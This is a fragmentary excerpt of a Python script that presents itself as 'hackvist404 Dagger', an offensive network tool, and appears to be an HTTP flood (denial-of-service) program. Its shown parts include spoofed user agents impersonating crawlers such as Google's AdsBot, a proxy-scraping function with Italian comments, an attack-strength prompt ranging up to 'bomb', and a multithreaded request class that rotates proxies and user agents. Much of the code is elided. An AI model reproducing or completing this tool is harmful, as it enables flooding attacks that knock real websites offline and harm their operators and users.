...
# =====================================================================================
#  ICPO Operations - Offensive Network Suite
#  Tool Name    : hackvist404 Dagger
#  Version      : 2.1.3-beta
#  Developed by : Hackvist404 (Lead), NexVoid, TraceBurner [Shadow Phantom Team]
#  Note         : Internal distribution only. Unauthorized use is prohibited.
# =====================================================================================
...
phantom_agents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
	...
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; r",
...
def proxyget(urlproxy): # lo dice il nome, questa funzione scarica i proxies
	try:
		...
		req.add_header("User-Agent", random.choice(phantom_agents)) # siccome il format del sito e' identico sia
...
def multiplication():
	global multiple
	try:
		multiple = int(input("Insert a number of multiplication for the attack [(1-5=normal)(50=powerful)(500 or more=bomb)]: "))
	except ValueError:
		print("You mistyped, try again.\n")
		multiplication()
	begin()
...
class RequestProxyHTTP(threading.Thread): # la classe del multithreading
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		useragent = "User-Agent: " + random.choice(phantom_agents) + "\r\n" # scelta useragent a caso
